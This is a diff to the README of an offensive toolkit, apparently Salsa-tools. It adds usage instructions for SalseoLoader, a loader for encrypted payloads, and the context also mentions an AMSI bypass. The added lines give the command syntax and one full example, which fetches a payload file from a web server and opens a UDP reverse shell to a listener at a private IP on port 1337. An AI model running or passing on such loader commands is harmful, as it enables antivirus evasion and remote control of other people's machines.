@@ -102,7 +102,14 @@ AMSI Bypass (Rastamouse) https://rastamouse.me/2018/11/amsiscanbuffer-bypass---p
 
 This software is the one that we will use to load the encrypted payload. SalseoLoader can be compiled as a library or as an executable. In the case that it is compiled as executable, we must only pass the argument that we want to execute. On the contrary, if we compile it as a library. We will have to make an export of the descriptor "main". And the way to create the argument, is done through the reading of environmental variables.
 
-# Usage SalseoLoader in .EXE reading the payload from a web server
+# Usage SalseoLoader
+```
+SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
+```
 
+# Usage SalseoLoader in .EXE reading from web server.
+```
+SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
+```
 ![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)
 
